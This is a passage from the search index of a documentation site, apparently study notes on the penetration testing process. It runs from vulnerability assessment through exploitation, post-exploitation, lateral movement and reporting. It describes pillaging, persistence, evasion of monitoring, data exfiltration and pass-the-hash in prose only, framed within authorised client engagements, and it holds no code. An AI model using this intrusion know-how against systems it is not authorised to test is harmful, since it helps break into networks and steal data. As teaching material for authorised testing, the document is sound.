to ours in most cases.</p>","tags":["Pentesting","Process","Vulnerability_Assessment","Pre-Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/2.%20Vulnerability%20Assessment/#assessment-of-possible-attack-vectors","title":"Assessment of Possible Attack Vectors","text":"<p><code>Vulnerability Assessment</code>\u00a0also includes the actual testing, which is part of\u00a0<code>Predictive Analysis</code>. In doing so, we analyze historical information and combine it with the current information that we have been able to find out. Whether we have received specific evasion level requirements from our client, we test the services and applications found\u00a0<code>locally</code>\u00a0or\u00a0<code>on the target system</code>. If we have to test covertly and avoid alerts, we should mirror the target system locally as precisely as possible. This means we use the information obtained during our information gathering phase to replicate the target system and then look for vulnerabilities in the locally deployed system.</p>","tags":["Pentesting","Process","Vulnerability_Assessment","Pre-Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/2.%20Vulnerability%20Assessment/#the-return","title":"The Return","text":"<p>Suppose we are unable to detect or identify potential vulnerabilities from our analysis. In that case, we will return to the\u00a0<code>Information Gathering</code>\u00a0stage and look for more in-depth information than we have gathered so far. It is important to note that these two stages (<code>Information Gathering</code>\u00a0and\u00a0<code>Vulnerability Assessment</code>) often overlap, resulting in regular back and forth movement between them. We will see this in many videos where the author is solving an HTB box or some CTF challenge. We should remember that these challenges are often solved as fast as possible, and therefore speed is more important than quality. In a CTF, the goal is to get on the target machine and\u00a0<code>capture the flags</code>\u00a0with the highest privileges as fast as possible instead of exposing all potential weaknesses in the system.</p> <code>A (real) Penetration Test is not a CTF.</code> <p>Here the\u00a0<code>quality</code>\u00a0and\u00a0<code>intensity</code>\u00a0of our penetration test and its analysis have the highest priority because nothing is worse if our client gets successfully hacked via a relatively simple vector that we should have uncovered during our penetration test.</p>","tags":["Pentesting","Process","Vulnerability_Assessment","Pre-Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/3.%20Exploitation/","title":"3. Exploitation","text":"<p>During the\u00a0<code>Exploitation</code>\u00a0stage, we look for ways that these weaknesses can be adapted to our use case to obtain the desired role (i.e., a foothold, escalated privileges, etc.). If we want to get a reverse shell, we need to modify the PoC to execute the code, so the target system connects back to us over (ideally) an encrypted connection to an IP address we specify. Therefore, the preparation of an exploit is mainly part of the\u00a0<code>Exploitation</code>\u00a0stage.</p> <p></p> <p>These stages should not be strictly separated from each other, as they are closely connected. Nevertheless, it is still important to distinguish which phase we are in and its purpose. Because later, with much more complex processes and much more information, it is very easy to lose track of the steps that have been taken, especially if the penetration test lasts several weeks and covers a massive scope.</p>","tags":["Pentesting","Process","Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/3.%20Exploitation/#prioritization-of-possible-attacks","title":"Prioritization of Possible Attacks","text":"<p>Once we have found one or two vulnerabilities during the\u00a0<code>Vulnerability Assessment</code>\u00a0stage that we can apply to our target network/system, we can prioritize those attacks. Which of those attacks we prioritize higher than the others depends on the following factors:</p> <ul> <li>Probability of Success</li> <li>Complexity</li> <li>Probability of Damage</li> </ul> <p>First, we need to assess the\u00a0<code>probability of successfully</code>\u00a0executing a particular attack against the target.\u00a0CVSS Scoring\u00a0can help us here, using the\u00a0NVD calculator\u00a0better to calculate the specific attacks and their probability of success.</p> <p><code>Complexity</code>\u00a0represents the effort of exploiting a specific vulnerability. This is used to estimate how much time, effort, and research is required to execute the attack on the system successfully. Our experience plays an important role here because if we are to carry out an attack that we have never used before, this will logically require much more research and effort since we must understand the attack and the exploit structure in detail before applying it.</p> <p>Estimating the\u00a0<code>probability of damage</code>\u00a0caused by the execution of an exploit plays a critical role, as we must avoid any damage to the target systems. Generally, we do not perform DoS attacks unless our client requires them. Nevertheless, attacking the running services live with exploits that can cause damage to the software or the operating system is something that we must avoid at all times.</p> <p>In addition, we can assign these factors to a personal point system which will allow the evaluation to be more accurately calculated based on our skills and knowledge:</p>","tags":["Pentesting","Process","Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/3.%20Exploitation/#prioritization-example","title":"Prioritization Example","text":"Factor Points Remote File Inclusion Buffer Overflow 1. Probability of Success <code>10</code> 10 8 2. Complexity - Easy <code>5</code> 4 0 3. Complexity - Medium <code>3</code> 0 3 4. Complexity - Hard <code>1</code> 0 0 5. Probability of Damage <code>-5</code> 0 -5 Summary <code>max. 15</code> 14 6 <p>Based on the above example, we would prefer the\u00a0<code>remote file inclusion</code>\u00a0attack. It is easy to prepare and execute and should not cause any damage if approached carefully.</p>","tags":["Pentesting","Process","Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/3.%20Exploitation/#preparation-for-the-attack","title":"Preparation for the Attack","text":"<p>Sometimes we will run into a situation where we can't find high-quality, known working PoC exploit code. Therefore, it may be necessary to reconstruct the exploit locally on a VM representing our target host to figure out precisely what needs to be adapted and changed. Once we have set up the system locally and installed known components to mirror the target environment as closely as possible (i.e., same version numbers for target services/applications), we can start preparing the exploit by following the steps described in the exploit. Then we test this on a locally hosted VM to ensure it works and does not damage significantly. In other situations, we will encounter misconfigurations and vulnerabilities that we see very often and know exactly which tool or exploit to use and whether the exploit or technique is \"safe\" or can cause instability.</p> <p>If ever in doubt before running an attack, it's always best to check with our client, providing them all necessary data so they can make an informed decision on whether they would like us to attempt exploitation or just mark the finding as an issue. If they opt for us not to proceed with exploitation, we can note in the report that it was not confirmed actively but is likely an issue that needs to be addressed. We have a certain amount of leeway during penetration tests and should always use our best judgment if a particular attack seems too risky or could potentially cause a disruption. When in doubt, communicate. Your team lead/manager, the client, will almost certainly prefer extra communication than run into a situation where they are trying to bring a system back online after a failed exploit attempt.</p> <p>Once we have successfully exploited a target and have initial access (and taken clear notes for our reports and logged all activities in our activity log!), we'll move on to the post-exploitation and lateral movement stages.</p>","tags":["Pentesting","Process","Exploitation"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/","title":"4. Post Exploitation","text":"<p>Let's assume we successfully exploited the target system during the\u00a0<code>Exploitation</code>\u00a0stage. As with the Exploitation stage, we must again consider whether or not to utilize\u00a0<code>Evasive Testing</code>\u00a0in the\u00a0<code>Post-Exploitation</code>\u00a0stage. We are already on the system in the post-exploitation phase, making it much more difficult to avoid an alert. The\u00a0<code>Post-Exploitation</code>\u00a0stage aims to obtain sensitive and security-relevant information from a local perspective and business-relevant information that, in most cases, requires higher privileges than a standard user. This stage includes the following components:</p> Evasive Testing Information Gathering Pillaging Vulnerability Assessment Privilege Escalation Persistence Data Exfiltration","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#_1","title":"4. Post Exploitation","text":"","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#evasive-testing","title":"Evasive Testing","text":"<p>If a skilled administrator monitors the systems, any change or even a single command could trigger an alarm that will give us away. In many cases, we get kicked out of the network, and then threat hunting begins where we are the focus. We may also lose access to a host (that gets quarantined) or a user account (that gets temporarily disabled or the password changed). This penetration test would have failed but succeeded in some ways because the client could detect some actions. We can provide value to the client in this situation by still writing up an entire attack chain and helping them identify gaps in their monitoring and processes where they did not notice our actions. For us, we can study how and why the client detected us and work on improving our evasion skills. Perhaps we did not thoroughly test a payload, or we got careless and ran a command such as\u00a0<code>net user</code>\u00a0or\u00a0<code>whoami</code>\u00a0that is often monitored by EDR systems and flagged as anomalous activity.</p> <p>It can often help our clients if we run commands or tools that their defenses stop or detect. It shows them that their defenses are working on some attacks. Keep in mind that we are emulating an attacker, so it's not always entirely bad for some of the attacks to get noticed. Though when performing evasive testing, our goal should be to go mostly undetected so we can identify any \"blind spots\" our clients have in their network environments.</p> <p>Evasive testing is divided into three different categories:</p> <code>Evasive</code> <code>Hybrid Evasive</code> <code>Non-Evasive</code> <p>This does not mean that we cannot use all three methods. Suppose our client wants to perform an intrusive penetration test to get as much information as possible and the most in-depth testing results. In that case, we will perform\u00a0<code>Non-Evasive</code>\u00a0Testing, as the security measures around the network may limit and even stop us. However, this can also be combined with\u00a0<code>Evasive</code>\u00a0testing, using the same commands and methods for non-evasive testing. We can then see if the security measures can identify and respond to the actions performed. In\u00a0<code>Hybrid-Evasive</code>\u00a0testing, we can test specific components and security measures that have been defined in advance. This is common when the customer only wants to test specific departments or servers to see if they can withstand the attacks.</p>","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#information-gathering","title":"Information Gathering","text":"<p>Since we have gained a new perspective on the system and the network of our target system in the Exploitation stage, we are basically in a new environment. This means we first have to reacquaint ourselves with what we are working with and what options are available. Therefore, in the\u00a0<code>Post-Exploitation</code>\u00a0stage, we go through the\u00a0<code>Information Gathering</code>\u00a0and\u00a0<code>Vulnerability Assessment</code>\u00a0stages again, which we can consider as parts of the current stage. This is because the information we had up to this point was gathered from an external perspective, not an internal one.</p> <p>From the inside (local) perspective, we have many more possibilities and alternatives to access certain information that is relevant to us. Therefore, the information gathering stage starts all over again from the local perspective. We search and gather as much information as we can. The difference here is that we also enumerate the local network and local services such as printers, database servers, virtualization services, etc. Often we will find shares intended for employees to use to exchange and share data and files. The investigation of these services and network components is called\u00a0<code>Pillaging</code>.</p>","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#pillaging","title":"Pillaging","text":"<p>Pillaging is the stage where we examine the role of the host in the corporate network. We analyze the network configurations, including but not limited to:</p> Interfaces Routing DNS ARP Services VPN IP Subnets Shares Network Traffic <p><code>Understanding the role of the system</code>\u00a0we are on also gives us an excellent understanding of how it communicates with other network devices and its purpose. From this, we can find out, for example, what alternative subdomains exist, whether it has multiple network interfaces, whether there are other hosts with which this system communicates, if admins are connecting to other hosts from it, and if we can potentially reuse credentials or steal an SSH key to further our access or establish persistence, etc. This helps, above all, to get an overview of the network's structure.</p> <p>For example, we can use the policies installed on this system to determine what other hosts are using on the network. Because administrators often use particular schemas to secure their network and prevent users from changing anything on it. For example, suppose we discover that the password policy requires only eight characters but no special characters. In that case, we can conclude that we have a relatively high probability of guessing other users' passwords on this and other systems.</p> <p>During the pillaging stage, we will also hunt for sensitive data such as passwords on shares, local machines, in scripts, configuration files, password vaults, documents (Excel, Word, .txt files, etc.), and even email.</p> <p>Our main goals with pillaging are to show the impact of successful exploitation and, if we have not yet reached the goal of the assessment, to find additional data such as passwords that can be inputs to other stages such as lateral movement.</p>","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#persistence","title":"Persistence","text":"<p>Once we have an overview of the system, our immediate next step is maintaining access to the exploited host. This way, if the connection is interrupted, we can still access it. This step is essential and often used as the first step before the\u00a0<code>Information Gathering</code>\u00a0and\u00a0<code>Pillaging</code>\u00a0stages.</p> <p>We should follow non-standardized sequences because each system is individually configured by a unique administrator who brings their own preferences and knowledge. It is recommended that we\u00a0<code>work flexibly</code>\u00a0during this phase\u00a0<code>and adapt</code>\u00a0to the circumstances. For example, suppose we have used a buffer overflow attack on a service that is likely to crash it. In that case, we should establish persistence to the system as soon as possible to avoid having to attack the service multiple times and potentially causing a disruption. Often if we lose the connection, we will not be able to access the system in the same way.</p>","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<p>If we can maintain access and have a good overview of the system, we can use the information about the system and its services and any other data stored on it to repeat the\u00a0<code>Vulnerability Assessment</code>\u00a0stage, but this time from inside the system. We analyze the information and prioritize it accordingly. The goal we pursue next is the escalation of privileges (if not already in place).</p> <p>Again, it is essential to distinguish between exploits that can harm the system and attacks against the services that do not cause any disruption. In doing so, we weigh the components we have already gone through in the first Vulnerability Assessment stage.</p>","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#privilege-escalation","title":"Privilege Escalation","text":"<p>Privilege escalation is significant, and in most cases, it represents a critical moment that can open many more new doors for us. Getting the highest possible privileges on the system or domain is often crucial. Therefore we want to get the privileges of the\u00a0<code>root</code>\u00a0(on\u00a0<code>Linux-based</code>\u00a0systems) or the domain\u00a0<code>administrator</code>/<code>local administrator</code>/<code>SYSTEM</code>\u00a0(on\u00a0<code>Windows-based</code>\u00a0systems) because this will often allow us to move through the entire network without any restrictions.</p> <p>However, it is essential to remember that the escalation of privileges does not always have to occur locally on the system. We can also obtain stored credentials during the information gathering stage from other users who are members of a higher privileged group. Exploiting these privileges to log in as another user is also part of privilege escalation because we have escalated our privileges (quickly) using the new set of credentials.</p>","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/4.%20Post-Exploitation/#data-exfiltration","title":"Data Exfiltration","text":"<p>During the\u00a0<code>Information Gathering</code>\u00a0and\u00a0<code>Pillaging</code>\u00a0stage, we will often be able to find, among other things, considerable personal information and customer data. Some clients will want to check whether it is possible to exfiltrate these types of data. This means we try to transfer this information from the target system to our own. Security systems such as\u00a0<code>Data Loss Prevention</code>\u00a0(<code>DLP</code>) and\u00a0<code>Endpoint Detection and Response</code>\u00a0(<code>EDR</code>) help detect and prevent data exfiltration. In addition to\u00a0<code>Network Monitoring</code>, many companies use encryption on hard drives to prevent external parties from viewing such information. Before exfiltrating any actual data, we should check with the customer and our manager. It can often be enough to create some bogus data (such as fake credit card numbers or social security numbers) and exfiltrate it to our system. That way, the protection mechanisms that look for patterns in data leaving the network will be tested, but we will not be responsible for any live sensitive data on our testing machine.</p> <p>Companies must adhere to data security regulations depending on the type of data involved. These include, but are not limited to:</p> Type of Information Security Regulation Credit Card Account Information <code>Payment Card Industry</code>\u00a0(<code>PCI</code>) Electronic Patient Health Information <code>Health Insurance Portability and Accountability Act</code>\u00a0(<code>HIPAA</code>) Consumers Private Banking Information <code>Gramm-Leach-Bliley</code>\u00a0(<code>GLBA</code>) Government Information <code>Federal Information Security Management Act of 2002</code>\u00a0(<code>FISMA</code>) <p>Some frameworks companies may follow include:</p> (<code>NIST</code>) - National Institute of Standards and Technology (<code>CIS Controls</code>) - Center for Internet Security Controls (<code>ISO</code>) - International Organization for Standardization (<code>PCI-DSS</code>) - The Payment Card Industry Data Security Standard (<code>GDPR</code>) - General Data Protection Regulation (<code>COBIT</code>) - Control Objectives for Information and Related Technologies (<code>FedRAMP</code>) - The Federal Risk and Authorization Management Program (<code>ITAR</code>) - International Traffic in Arms Regulations (<code>AICPA</code>) - American Institute of Certified Public Accountants (<code>NERC CIP Standards</code>) - NERC Critical Infrastructure Protection Standards <p>It is worth familiarizing ourselves with each of these frameworks but what is crucial for us, however, is how we handle this information. For us, the type of data does not have much significance, but the required controls around it do, and as stated previously, we can simulate exfiltrating data from the network as a proof of concept that it is possible. We should check with the client to ensure that their systems are intended to catch the fake data type that we attempt to exfiltrate if we are successful, so we do not misrepresent anything in our report.</p> <p>It's a good habit to run a screen recording (along with taking screenshots) as additional evidence for such vital steps. If we only have terminal access, we can display the hostname, IP address, user name, and the corresponding path to the customer file and take a screenshot or screen capture. This helps us prove where the data originated from and that we could remove it from the environment successfully.</p> <p>If sensitive data like this is found, our client should, of course, be informed immediately. Based on the fact that we could escalate the privileges and exfiltrate personal data, they may want to pause, end, or shift the focus of the penetration test, especially if data exfiltration was the primary goal. However, this is at our client's discretion, and many will prefer that we keep testing to identify all possible weaknesses in their environment.</p> <p>Next, we'll discuss lateral movement, a key stage in the penetration testing process that may use data from our post-exploitation as an input.</p>","tags":["Process","Post-Exploitation","Pentesting"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/5.%20Latteral%20Movement/","title":"5. Latteral Movement","text":"<p>If everything went well and we were able to penetrate the corporate network (<code>Exploitation</code>) successfully, gather locally stored information, and escalate our privileges (<code>Post-Exploitation</code>), we next enter the\u00a0<code>Lateral Movement</code>\u00a0stage. The goal here is that we test what an attacker could do within the entire network. After all, the main goal is not only to successfully exploit a publicly available system but also to get sensitive data or find all ways that an attacker could render the network unusable. One of the most common examples is\u00a0ransomware. If a system in the corporate network is infected with ransomware, it can spread across the entire network. It locks down all the systems using various encryption methods, making them unusable for the whole company until a decryption key is entered.</p> <p>In the most common cases, the company is financially extorted to make a profit. Often, it is only at this moment that companies realize how important IT security is. If they had had a good penetration tester who had tested things (and proper processes and layered defenses in place), they probably could have prevented such a situation and the financial (if not legal) damage. It is often forgotten that in many countries, the\u00a0<code>CEOs are held liable</code>\u00a0for not securing their customer data appropriately.</p> <p></p> <p>In this stage, we want to test how far we can move manually in the entire network and what vulnerabilities we can find from the internal perspective that might be exploited. In doing so, we will again run through several phases:</p> <ol> <li>Pivoting</li> <li>Evasive Testing</li> <li>Information Gathering</li> <li>Vulnerability Assessment</li> <li>(Privilege) Exploitation</li> <li>Post-Exploitation</li> </ol> <p>As seen in the graphic above, we can move to this stage from the\u00a0<code>Exploitation</code>\u00a0and the\u00a0<code>Post-Exploitation</code>\u00a0stage. Sometimes we may not find a direct way to escalate our privileges on the target system itself, but we have ways to move around the network. This is where\u00a0<code>Lateral Movement</code>\u00a0comes into play.</p>","tags":["Pentesting","Latteral_Movement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/5.%20Latteral%20Movement/#pivoting","title":"Pivoting","text":"<p>In most cases, the system we use will not have the tools to enumerate the internal network efficiently. Some techniques allow us to use the exploited host as a proxy and perform all the scans from our attack machine or VM. In doing so, the exploited system represents and routes all our network requests sent from our attack machine to the internal network and its network components.</p> <p>In this way, we make non-routable networks (and therefore publicly unreachable) can still be reached. This allows us to scan them for vulnerabilities and penetrate deeper into the network. This process is also known as\u00a0<code>Pivoting</code>\u00a0or\u00a0<code>Tunneling</code>.</p> <p>An elementary example could be that we have a printer at home that is not accessible from the Internet, but we can send print jobs from our home network. If one of the hosts on our home network has been compromised, it could be leveraged to send these jobs to the printer. Though this is a simple (and unlikely) example, it illustrates the goal of\u00a0<code>pivoting</code>, which is to access inaccessible systems via an intermediary system.</p>","tags":["Pentesting","Latteral_Movement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/5.%20Latteral%20Movement/#evasive-testing","title":"Evasive Testing","text":"<p>Also, at this stage, we should consider whether evasive testing is part of the assessment scope. There are different procedures for each tactic, which support us in disguising these requests to not trigger an internal alarm among the administrators and the blue team.</p> <p>There are many ways to protect against lateral movement, including network (micro)\u00a0<code>segmentation</code>,\u00a0<code>threat monitoring</code>,\u00a0<code>IPS</code>/<code>IDS</code>,\u00a0<code>EDR</code>, etc. To bypass these efficiently, we need to understand how they work and what they respond to. Then we can adapt and apply methods and strategies that help avoid detection.</p>","tags":["Pentesting","Latteral_Movement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/5.%20Latteral%20Movement/#information-gathering","title":"Information Gathering","text":"<p>Before we target the internal network, we must first get an\u00a0<code>overview</code>\u00a0of which systems and how many can be reached from our system. This information may already be available to us from the last post-exploitation stage, where we took a closer look at the settings and configurations of the system.</p> <p>We return to the Information Gathering stage, but this time, we do it from inside the network with a different view of it. Once we have discovered all hosts and servers, we can enumerate them individually.</p>","tags":["Pentesting","Latteral_Movement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/5.%20Latteral%20Movement/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<p>Vulnerability assessment from the inside of the network differs from the previous procedures. This is because far more errors occur inside a network than on hosts and servers exposed to the Internet. Here, the\u00a0<code>groups</code>\u00a0to which one has been assigned and the\u00a0<code>rights</code>\u00a0to different system components play an essential role. In addition, it is common for users to share information and documents and work on them together.</p> <p>This type of information is of particular interest to us when planning our attacks. For example, if we compromise a user account assigned to a developer group, we may gain access to most of the resources used by company developers. This will likely provide us with crucial internal information about the systems and could help us to identify flaws or further our access.</p>","tags":["Pentesting","Latteral_Movement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/5.%20Latteral%20Movement/#privilege-exploitation","title":"(Privilege) Exploitation","text":"<p>Once we have found and prioritized these paths, we can jump to the step where we use these to access the other systems. We often find ways to crack passwords and hashes and gain higher privileges. Another standard method is to use our existing credentials on other systems. There will also be situations where we do not even have to crack the hashes but can use them directly. For example, we can use the tool\u00a0Responder\u00a0to intercept NTLMv2 hashes. If we can intercept a hash from an administrator, then we can use the\u00a0<code>pass-the-hash</code>\u00a0technique to log in as that administrator (in most cases) on multiple hosts and servers.</p> <p>After all, the\u00a0<code>Lateral Movement</code>\u00a0stage aims to move through the internal network. Existing data and information can be versatile and often used in many ways.</p>","tags":["Pentesting","Latteral_Movement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/5.%20Latteral%20Movement/#post-exploitation","title":"Post-Exploitation","text":"<p>Once we have reached one or more hosts or servers, we go through the steps of the post-exploitation stage again for each system. Here we again collect system information, data from created users, and business information that can be presented as evidence. However, we must again consider how this different information must be handled and the rules defined around sensitive data in the contract.</p> <p>Finally, we are ready to move on to the\u00a0<code>Proof-of-Concept</code>\u00a0phase to show off our hard work and help our client, and those responsible for remediation efficiently reproduce our results.</p>","tags":["Pentesting","Latteral_Movement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/","title":"Summary","text":"","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#pre-engagement","title":"Pre-Engagement","text":"<p><code>Pre-engagement</code>\u00a0is educating the client and adjusting the contract. All necessary tests and their components are strictly defined and contractually recorded. In a face-to-face meeting or conference call, many arrangements are made, such as:</p> <ul> <li><code>Non-Disclosure Agreement</code></li> <li><code>Goals</code></li> <li><code>Scope</code></li> <li><code>Time Estimation</code></li> <li><code>Rules of Engagement</code></li> </ul>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#information-gathering","title":"Information Gathering","text":"<p><code>Information gathering</code>\u00a0describes how we obtain information about the necessary components in various ways. We search for information about the target company and the software and hardware in use to find potential security gaps that we may be able to leverage for a foothold.</p>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<p>Once we get to the\u00a0<code>Vulnerability Assessment</code>\u00a0stage, we analyze the results from our\u00a0<code>Information Gathering</code>\u00a0stage, looking for known vulnerabilities in the systems, applications, and various versions of each to discover possible attack vectors. Vulnerability assessment is the evaluation of potential vulnerabilities, both manually and through automated means. This is used to determine the threat level and the susceptibility of a company's network infrastructure to cyber-attacks.</p>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#exploitation","title":"Exploitation","text":"<p>In the\u00a0<code>Exploitation</code>\u00a0stage, we use the results to test our attacks against the potential vectors and execute them against the target systems to gain initial access to those systems.</p>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#post-exploitation","title":"Post-Exploitation","text":"<p>At this stage of the penetration test, we already have access to the exploited machine and ensure that we still have access to it even if modifications and changes are made. During this phase, we may try to escalate our privileges to obtain the highest possible rights and hunt for sensitive data such as credentials or other data that the client is concerned with protecting (pillaging). Sometimes we perform post-exploitation to demonstrate to a client the impact of our access. Other times we perform post-exploitation as an input to the lateral movement process described next.</p>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#lateral-movement","title":"Lateral Movement","text":"<p>Lateral movement describes movement within the internal network of our target company to access additional hosts at the same or a higher privilege level. It is often an iterative process combined with post-exploitation activities until we reach our goal. For example, we gain a foothold on a web server, escalate privileges and find a password in the registry. We perform further enumeration and see that this password works to access a database server as a local admin user. From here, we can pillage sensitive data from the database and find other credentials to further our access deeper into the network. In this stage, we will typically use many techniques based on the information found on the exploited host or server.</p>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#proof-of-concept","title":"Proof-of-Concept","text":"<p>In this stage, we document, step-by-step, the steps we took to achieve network compromise or some level of access. Our goal is to paint a picture of how we were able to chain together multiple weaknesses to reach our goal so they can see a clear picture of how each vulnerability fits in and help prioritize their remediation efforts. If we don't document our steps well, it's hard for the client to understand what we were able to do and, thus, makes their remediation efforts more difficult. If feasible, we could create one or more scripts to automate the steps we took to assist our client in reproducing our findings. We cover this in-depth in the\u00a0<code>Documentation &amp; Reporting</code>\u00a0module.</p>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#post-engagement","title":"Post-Engagement","text":"<p>During post-engagement, detailed documentation is prepared for both administrators and client company management to understand the severity of the vulnerabilities found. At this stage, we also clean up all traces of our actions on all hosts and servers. During this stage, we create the deliverables for our client, hold a report walkthrough meeting, and sometimes deliver an executive presentation to target company executives or their board of directors. Lastly, we will archive our testing data per our contractual obligations and company policy. We will typically retain this data for a set period or until we perform a post-remediation assessment (retest) to test the client's fixes.</p>","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Assessment%20Specific%20Stages/Summary/#importance","title":"Importance","text":"<p>We must internalize this procedure and use it as a basis for all our technical engagements. Each stage's components allow us to precisely understand which areas we need to improve upon and where most of our difficulties and gaps in knowledge are. For example, we can think of a website as a target we need to study.</p> Stage Description <code>1. Pre-Engagement</code> The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions. <code>2. Information Gathering</code> Once the pre-engagement activities are complete, we investigate the company's existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions. <code>3. Vulnerability Assessment</code> With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions. <code>4. Exploitation</code> Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities. <code>5. Post-Exploitation</code> Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations). <code>6. Lateral Movement</code> If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered. <code>7. Proof-of-Concept</code> We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities. <code>8. Post-Engagement</code> Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings.","tags":["Pentesting","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/","title":"Post Engagement","text":"<p>Much like there is considerable legwork before an engagement officially starts (when testing begins), we must perform many activities (many of them contractually binding) after our scans, exploitation, lateral movement, and post-exploitation activities are complete. No two engagements are the same, so these activities may differ slightly but generally must be performed to close out an engagement fully.</p> <p></p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#cleanup","title":"Cleanup","text":"<p>Once testing is complete, we should perform any necessary cleanup, such as deleting tools/scripts uploaded to target systems, reverting any (minor) configuration changes we may have made, etc. We should have detailed notes of all of our activities, making any cleanup activities easy and efficient. If we cannot access a system where an artifact needs to be deleted, or another change reverted, we should alert the client and list these issues in the report appendices. Even if we can remove any uploaded files and revert changes (such as adding a local admin account), we should document these changes in our report appendices in case the client receives alerts that they need to follow up on and confirm that the activity in question was part of our sanctioned testing.</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#documentation-and-reporting","title":"Documentation and Reporting","text":"<p>Before completing the assessment and disconnecting from the client's internal network or sending \"stop\" notification emails to signal the end of testing (meaning no more interaction with the client's hosts), we must make sure to have adequate documentation for all findings that we plan to include in our report. This includes command output, screenshots, a listing of affected hosts, and anything else specific to the client environment or finding. We should also make sure that we have retrieved all scan and log output if the client hosted a VM in their infrastructure for an internal penetration test and any other data that may be included as part of the report or as supplementary documentation. We should not keep any Personal Identifiable Information (PII), potentially incriminating info, or other sensitive data we came across throughout testing.</p> <p>We should already have a detailed list of the findings we will include in the report and all necessary details to tailor the findings to the client's environment. Our report deliverable (which is covered in detail in the\u00a0Documentation &amp; Reporting\u00a0module) should consist of the following:</p> <ul> <li>An attack chain (in the event of full internal compromise or external to internal access) detailing steps taken to achieve compromise</li> <li>A strong executive summary that a non-technical audience can understand</li> <li>Detailed findings specific to the client's environment that include a risk rating, finding impact, remediation recommendations, and high-quality external references related to the issue</li> <li>Adequate steps to reproduce each finding so the team responsible for remediation can understand and test the issue while putting fixes in place</li> <li>Near, medium, and long-term recommendations specific to the environment</li> <li>Appendices which include information such as the target scope, OSINT data (if relevant to the engagement), password cracking analysis (if relevant), discovered ports/services, compromised hosts, compromised accounts, files 